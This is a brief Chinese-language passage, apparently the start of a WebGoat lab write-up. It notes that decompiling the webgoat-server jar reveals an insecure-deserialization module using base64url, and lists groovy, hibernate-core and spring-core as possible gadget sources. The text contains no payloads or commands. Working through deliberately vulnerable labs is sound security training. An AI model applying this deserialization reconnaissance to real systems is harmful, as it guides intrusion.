安装Webgoat靶场

解题分析

  • 查看题目

  • 反编译webgoat-server的jar包，查看BOOT-INF/lib/insecure-deserialization-8.0.0.M25.jar存在反序列化漏洞，且编码是base64url

  • 查看jar包的组件，groovy,hibernate-core,spring-core可能存在反序列化漏洞。
